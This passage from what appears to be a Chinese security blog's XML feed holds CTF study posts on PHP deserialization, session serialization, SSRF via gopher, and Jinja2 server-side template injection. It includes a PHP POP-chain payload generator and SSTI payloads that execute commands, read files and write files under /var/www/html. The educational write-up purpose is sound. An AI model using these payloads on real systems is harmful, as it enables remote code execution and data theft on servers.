class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    protected $obj;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        //$obj = new test1; 这里可以控制$obj为任意对象</span><br><span class="line">        $this-&gt;obj-&gt;a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test1&#123;</span><br><span class="line">    function a()&#123;</span><br><span class="line">        echo &quot;123&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test2&#123;</span><br><span class="line">    private $data;</span><br><span class="line">    function a()&#123;</span><br><span class="line">        eval($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&#x27;a&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>利用的pop链。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">class OowoO&#123;</span><br><span class="line">    protected $obj;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;obj = new test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class test2&#123;</span><br><span class="line">    private $data = &quot;phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo urlencode(serialize(new OowoO()));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200601123243831-993781483.png" alt="img"></p><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>session主要就是一个存取对话信息或者通话的变量，一般session的值session.save_handler来进行存储的。</p><p>关于session的存储，java是将用户的session存入内存中，而php则是将session以文件的形式存储在服务器某个tmp文件中，可以在php.ini里面设置session.save_path存储的位置</p><ol><li>session.serialize_handler = php序列化的结果</li></ol><p><img src="https://img2018.cnblogs.com/blog/1419450/201903/1419450-20190301153453970-831696609.png" alt="img"></p><p>它的规则是$_SESSION是个数组，数组中的键和值中间用 | 来分割，值如果是数组或对象按照序列化的格式存储</p><p>session.serialize_handler = php_serialize的序列化结果</p><p><img src="https://img2018.cnblogs.com/blog/1419450/201903/1419450-20190301153731026-2081840128.png" alt="img"></p><p>它是全程按照serialize的格式序列化了$_SESSION这个数组</p><p>它比php的格式多了个最前面多了个 “a:2:{ ….” 也就是$_SESSION这个数组有2个元素，还有个区别在于，它的键名也表明了长度和属性，中间用 ; 来隔开键值对</p><h3 id="储存溢出"><a href="#储存溢出" class="headerlink" title="储存溢出"></a>储存溢出</h3><p>PHP中的session中的内容默认是以文件的方式储存，储存方式是由配置项 session.save_handler 来 进行确定的，默认是以文件的方式储存。储存的文件是以 sess_PHPSESSID 来进行命名的，文件的内容 就是session值得序列化之后得内容。</p><h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h3><p>序列化对象中字符串的长度，只能反序列化相应长度的字，不能进行闭合。</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;i:0;s:3:&quot;123&quot;;&#125;???</span><br><span class="line">a:1:&#123;i:0;s:3:&quot;123&quot;;&#125;;&#125;</span><br></pre></td></tr></table></figure><p>根据反序列化我们可以看到上面之后的反序列话是一样的，所以在做相应的题目时，我们可以通过字符串溢出来进行编码</p><p>一般会有一个函数或者方法将字符串改变</p><p>例如：</p><p>将flag换成index，长度就加一上面的遇到这类型，我们都可以用字符串溢出的方式来进行反序列化获取参数。</p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php序列化和反序列化</title>
      <link href="/2021/09/12/%E2%80%9Cphp%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/09/12/%E2%80%9Cphp%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP序列化和反序列化"><a href="#PHP序列化和反序列化" class="headerlink" title="PHP序列化和反序列化"></a>PHP序列化和反序列化</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p>在php文件中，我们需要将变量存储在数据库中，我们需要将变量序列化转换为字符串的过程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class man&#123;</span><br><span class="line"> public $name;</span><br><span class="line"> public $age;</span><br><span class="line"> public $height;</span><br><span class="line"> </span><br><span class="line"> function __construct($name,$age,$height)&#123;        //_construct：创建对象时初始化</span><br><span class="line">  $this-&gt;name = $name;</span><br><span class="line">  $this-&gt;age = $age;</span><br><span class="line">  $this-&gt;height = $height;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$man=new man(&quot;Bob&quot;,5,20);</span><br><span class="line">var_dump(serialize($man));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(67) &quot;O:3:&quot;man&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:5;s:6:&quot;height&quot;;i:</span><br></pre></td></tr></table></figure><p>如图这就是个序列化的过程。</p><p>在我们看到序列化输出以后我们需要了解相应字符的意思</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O 对象</span><br><span class="line">s 字符串</span><br><span class="line">i 整型数据</span><br><span class="line">d double型数据</span><br></pre></td></tr></table></figure><p>其实大部分都是根据首字母的意思和各个编程语言是语言是一样的</p><h3 id="序列化函数"><a href="#序列化函数" class="headerlink" title="序列化函数"></a>序列化函数</h3><p><strong>serialize</strong>：没错序列化就是这个函数，在官方定义了这个函数</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="定义：-1"><a href="#定义：-1" class="headerlink" title="定义："></a>定义：</h3><p>反序列化也就是将字符串转换为变量的逆过程。</p><h3 id="反序列化函数"><a href="#反序列化函数" class="headerlink" title="反序列化函数"></a>反序列化函数</h3><p><strong>unserialize</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class man&#123;</span><br><span class="line"> public $name;</span><br><span class="line"> public $age;</span><br><span class="line"> public $height;</span><br><span class="line"> </span><br><span class="line"> function __construct($name,$age,$height)&#123;</span><br><span class="line">  $this-&gt;name = $name;</span><br><span class="line">  $this-&gt;age = $age;</span><br><span class="line">  $this-&gt;height = $height;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$man= &#x27;O:3:&quot;man&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:5;s:6:&quot;height&quot;;i:20;&#125;&#x27;;</span><br><span class="line">var_dump(unserialize($man));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">object(man)#1 (3) &#123;</span><br><span class="line">  [&quot;name&quot;]=&gt;</span><br><span class="line">  string(3) &quot;Bob&quot;</span><br><span class="line">  [&quot;age&quot;]=&gt;</span><br><span class="line">  int(5)</span><br><span class="line">  [&quot;height&quot;]=&gt;</span><br><span class="line">  int(20)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再一次就要提到以下的东西</p><h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_construct()：创建对象时初始化</span><br><span class="line">_destruction()：结束时销毁对象</span><br><span class="line">_toString()：对象被当作字符串时使用</span><br><span class="line">_sleep()：序列化对象之前调用</span><br><span class="line">_wakeup()：反序列化之前调用</span><br><span class="line">_call()：调用对象不存在时使用</span><br><span class="line">_get()：调用私有属性时使用</span><br><span class="line">_set(): 用于数据写入补课访问的属性</span><br><span class="line">_isset(): 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">_unset()：在补课访问的属性上使用unset()时触发</span><br><span class="line">_invoke(): 当甲苯尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><p>在序列化和反序列化中，有这样一些魔法函数在相对应的时候会执行相应的函数，我们网络安全中，反序列化漏洞就是可以通过这些魔法函数来进行。</p><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>PHP反序列化漏洞也叫PHP对象注入，是一个非常常见的漏洞，这种类型的漏洞虽然有些难以利用，但一旦利用成功就会造成非常危险的后果。漏洞的形成的根本原因是程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果。反序列化漏洞并不是PHP特有，也存在于Java、Python等语言之中，但其原理基本相通。</p><p>一般程序在创建的时候，都会重写析构函数和构造函数，反序列化就是利用这些重写的函数。</p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF题解（2）</title>
      <link href="/2021/09/11/SSRF%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/"/>
      <url>/2021/09/11/SSRF%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><h3 id="考点：gopher协议的使用"><a href="#考点：gopher协议的使用" class="headerlink" title="考点：gopher协议的使用"></a>考点：gopher协议的使用</h3><p>进入题目以后，我们看到的是一个空白页，可输入url栏，然后我们</p><p>根据提示使用file://协议查看index.php,和flag.php。</p><p><img src="/2021/09/11/SSRF%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/1.png"></p><p><img src="/2021/09/11/SSRF%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/2.png"></p><p>然后我们发现给出了一个值key并且得到了两个源代码，我们发现在</p><p>index.php中有curl函数，我们可以使用curl函数进行访问。然后我们通过gopher协议</p><p>下面说一下gopher协议的写法</p><ol><li><p>首先我们先要先方式，然后写上传文件，然后HTTP版本</p></li><li><p>在描写完这些过后我们再进行其他内容需要上传的比如key</p></li><li><p>然后我们需要进行urlencoded我们第一次编码需要将所有的%A换成%0D%0A然后再进行两次编码，最后上传就行。</p></li></ol><p>我们得到的是这样的</p><p><img src="/2021/09/11/SSRF%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/3.png"></p><p>然后就可以得到flag</p><p><strong>题后反思</strong>：主要就是gopher协议的使用</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="考点：gopher协议的构建"><a href="#考点：gopher协议的构建" class="headerlink" title="考点：gopher协议的构建"></a>考点：gopher协议的构建</h3><p>进入题目之后，我们先根据提示访问flag.php，然后我们就可以看到一个文件上传的端口但是缺少了submit，需要我们自己编写然后，我们根据提示上传flag.php文件</p><p><img src="/2021/09/11/SSRF%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/4.png"></p><p>然后我们自己添加之后我们上传一个不为空白的文件</p><p><img src="/2021/09/11/SSRF%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/5.png"></p><p>然后我们使用bp抓包按照POST方式进行gopher协议的搭建最后就可以上传了，就可以得到flag了。</p><p><strong>题后反思</strong>：上传文件我们一般可以通过gopher协议进行如果不行可以考虑tf协议。</p>]]></content>
      
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI</title>
      <link href="/2021/09/08/SSTI/"/>
      <url>/2021/09/08/SSTI/</url>
      
        <content type="html"><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="什么是SSTI"><a href="#什么是SSTI" class="headerlink" title="什么是SSTI"></a>什么是SSTI</h2><p>SSTI就是服务端模板注入（Server-Side Template Injection）,也给出了一个注入的概念。</p><p>常见的注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。sql注入已经出世很多年了，对于sql注入的概念和原理很多人应该是相当清楚了，SSTI也是注入类的漏洞，其成因其实是可以类比于sql注入的。</p><p>sql注入是从用户获得一个输入，然后又后端脚本语言进行数据库查询，所以可以利用输入来拼接我们想要的sql语句，当然现在的sql注入防范做得已经很好了，然而随之而来的是更多的漏洞。</p><p><strong>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</strong></p><p>现在网上提起的比较多的是Python的网站。</p><h2 id="什么是模板引擎？"><a href="#什么是模板引擎？" class="headerlink" title="什么是模板引擎？"></a>什么是模板引擎？</h2><pre><code> 模板引擎（这里特质用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的。它可以特定生产格式的文档，用于网站的模板引擎就会生成一个标准的Html文档。</code></pre><p>​    也就是说，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后就生成模板+用户数据前端的html页面，然后反馈给浏览器，呈现在用户面前。</p><p><strong>模板引擎可以使用沙箱机制来进行漏洞防范，我们可以用沙箱逃逸技术来进行绕过。</strong></p><p>PS. php(或者其他脚本语言)代码通过访问模板引擎，模板引擎通过正则匹配产生一个新的缓存的html页面，从而实现php与html代码的分离。</p><h2 id="为什么要模板引擎"><a href="#为什么要模板引擎" class="headerlink" title="为什么要模板引擎"></a>为什么要模板引擎</h2><p>​    如果在一个页面中php代码与html代码混合在一起，在很多时候都会造成不便，用模板引擎可以让php代码和html代码进行分离。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;])); </span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure><p>这是一个比较鸡蛋的例子，对于现在的SSTI在后端处理的时候也会有许多的过滤。</p><p>总之，SSTI就是这个道理，就像sql注入中你用id=-1’ union select database()可以拿到数据库一样，当然在漏洞利用上还是有很多的技巧，也会有绕过的技巧的。</p><h3 id="Flask（JinJa2）服务端模板注入漏洞复现"><a href="#Flask（JinJa2）服务端模板注入漏洞复现" class="headerlink" title="Flask（JinJa2）服务端模板注入漏洞复现"></a>Flask（JinJa2）服务端模板注入漏洞复现</h3><p>ctf中比较常见的还是python站的SSTI，下面的是一道ssti漏洞的题目，展示一下流程。</p><ol><li>注入检测</li></ol><p>访问<a href="http://192.168.1.10:8000/">http://192.168.1.10:8000/</a></p><p>传参？name=56</p><p>我们可以得到</p><p><img src="https://img-blog.csdnimg.cn/20190719150209205.png" alt="在这里插入图片描述"></p><p>说明存在SSTI漏洞</p><ol start="2"><li>漏洞利用</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">&#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">&#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">&#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">&#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h2 id="关于SSTI的python类的知识"><a href="#关于SSTI的python类的知识" class="headerlink" title="关于SSTI的python类的知识"></a>关于SSTI的python类的知识</h2><p>面向对象语言的方法来自于类，对于python，有很多好用的函数库，我们经常会再写Python中用到import来引入许多的类和方法，python的str（字符串）、dict（字典）、tuple（元组）、list（列表）这些在Python类结构的基类都是object，而object拥有众多的子类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__</span><br><span class="line">&lt;type &#x27;str&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;type &#x27;tuple&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &#x27;list&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__</span><br><span class="line">&lt;type &#x27;dict&#x27;&gt;</span><br></pre></td></tr></table></figure><p>_ class _:来查看变量所属的类，根据前面的变量形势可以得到齐属于的类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__</span><br><span class="line">(&lt;type &#x27;basestring&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [].__class__.__bases__[0]</span><br><span class="line">&lt;type &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure><p>__bases__：用来查看类的基类，也可是使用数组索引来查看特定位置的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()</span><br><span class="line">[&lt;type &#x27;type&#x27;&gt;, &lt;type &#x27;weakref&#x27;&gt;, &lt;type &#x27;weakcallableproxy&#x27;&gt;, &lt;type &#x27;weakproxy&#x27;&gt;, &lt;type &#x27;int&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;bytearray&#x27;&gt;, &lt;type &#x27;list&#x27;&gt;, &lt;type &#x27;NoneType&#x27;&gt;, &lt;type &#x27;NotImplementedType&#x27;&gt;, &lt;type &#x27;traceback&#x27;&gt;, &lt;type &#x27;super&#x27;&gt;, &lt;type &#x27;xrange&#x27;&gt;, &lt;type &#x27;dict&#x27;&gt;, &lt;type &#x27;set&#x27;&gt;, &lt;type &#x27;slice&#x27;&gt;, &lt;type &#x27;staticmethod&#x27;&gt;, &lt;type &#x27;complex&#x27;&gt;, &lt;type &#x27;float&#x27;&gt;, &lt;type &#x27;buffer&#x27;&gt;, &lt;type &#x27;long&#x27;&gt;, &lt;type &#x27;frozenset&#x27;&gt;, &lt;type &#x27;property&#x27;&gt;, &lt;type &#x27;memoryview&#x27;&gt;, &lt;type &#x27;tuple&#x27;&gt;, &lt;type &#x27;enumerate&#x27;&gt;, &lt;type &#x27;reversed&#x27;&gt;, &lt;type &#x27;code&#x27;&gt;, &lt;type &#x27;frame&#x27;&gt;, &lt;type &#x27;builtin_function_or_method&#x27;&gt;, &lt;type &#x27;instancemethod&#x27;&gt;, &lt;type &#x27;function&#x27;&gt;, &lt;type &#x27;classobj&#x27;&gt;, &lt;type &#x27;dictproxy&#x27;&gt;, &lt;type &#x27;generator&#x27;&gt;, &lt;type &#x27;getset_descriptor&#x27;&gt;, &lt;type &#x27;wrapper_descriptor&#x27;&gt;, &lt;type &#x27;instance&#x27;&gt;, &lt;type &#x27;ellipsis&#x27;&gt;, &lt;type &#x27;member_descriptor&#x27;&gt;, &lt;type &#x27;file&#x27;&gt;, &lt;type &#x27;PyCapsule&#x27;&gt;, &lt;type &#x27;cell&#x27;&gt;, &lt;type &#x27;callable-iterator&#x27;&gt;, &lt;type &#x27;iterator&#x27;&gt;, &lt;type &#x27;sys.long_info&#x27;&gt;, &lt;type &#x27;sys.float_info&#x27;&gt;, &lt;type &#x27;EncodingMap&#x27;&gt;, &lt;type &#x27;fieldnameiterator&#x27;&gt;, &lt;type &#x27;formatteriterator&#x27;&gt;, &lt;type &#x27;sys.version_info&#x27;&gt;, &lt;type &#x27;sys.flags&#x27;&gt;, &lt;type &#x27;sys.getwindowsversion&#x27;&gt;, &lt;type &#x27;exceptions.BaseException&#x27;&gt;, &lt;type &#x27;module&#x27;&gt;, &lt;type &#x27;imp.NullImporter&#x27;&gt;, &lt;type &#x27;zipimport.zipimporter&#x27;&gt;, &lt;type &#x27;nt.stat_result&#x27;&gt;, &lt;type &#x27;nt.statvfs_result&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;_abcoll.Hashable&#x27;&gt;, &lt;type &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_abcoll.Iterable&#x27;&gt;, &lt;class &#x27;_abcoll.Sized&#x27;&gt;, &lt;class &#x27;_abcoll.Container&#x27;&gt;, &lt;class &#x27;_abcoll.Callable&#x27;&gt;, &lt;type &#x27;dict_keys&#x27;&gt;, &lt;type &#x27;dict_items&#x27;&gt;, &lt;type &#x27;dict_values&#x27;&gt;, &lt;class &#x27;site._Printer&#x27;&gt;, &lt;class &#x27;site._Helper&#x27;&gt;, &lt;type &#x27;_sre.SRE_Pattern&#x27;&gt;, &lt;type &#x27;_sre.SRE_Match&#x27;&gt;, &lt;type &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;site.Quitter&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;type &#x27;operator.itemgetter&#x27;&gt;, &lt;type &#x27;operator.attrgetter&#x27;&gt;, &lt;type &#x27;operator.methodcaller&#x27;&gt;, &lt;type &#x27;functools.partial&#x27;&gt;, &lt;type &#x27;MultibyteCodec&#x27;&gt;, &lt;type &#x27;MultibyteIncrementalEncoder&#x27;&gt;, &lt;type &#x27;MultibyteIncrementalDecoder&#x27;&gt;, &lt;type &#x27;MultibyteStreamReader&#x27;&gt;, &lt;type &#x27;MultibyteStreamWriter&#x27;&gt;</span><br></pre></td></tr></table></figure><p><strong>subclasses</strong>()：查看当前类的子类。</p><p>获取基类还能用还有__mro__，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__</span><br><span class="line">(&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__mro__</span><br><span class="line">(&lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__.__mro__</span><br><span class="line">(&lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">&gt;&gt;&gt; ().__class__.__mro__</span><br><span class="line">(&lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; ().__class__.__mro__[1]            //使用索引就能获取基类了</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure><p>这样我们在进行SSTI注入的时候就可以通过这种方式使用很多的类和方法，通过子类再去获取子类的子类。</p><h2 id="一些常用的方法"><a href="#一些常用的方法" class="headerlink" title="一些常用的方法"></a>一些常用的方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//获取基本类</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">object</span><br><span class="line"></span><br><span class="line">//读文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](r&#x27;C:\1.php&#x27;).read()</span><br><span class="line">object.__subclasses__()[40](r&#x27;C:\1.php&#x27;).read()</span><br><span class="line"></span><br><span class="line">//写文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)</span><br><span class="line">object.__subclasses__()[40](&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)</span><br><span class="line"></span><br><span class="line">//执行任意命令</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span><br><span class="line">object.__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>curl</title>
      <link href="/2021/08/27/curl/"/>
      <url>/2021/08/27/curl/</url>
      
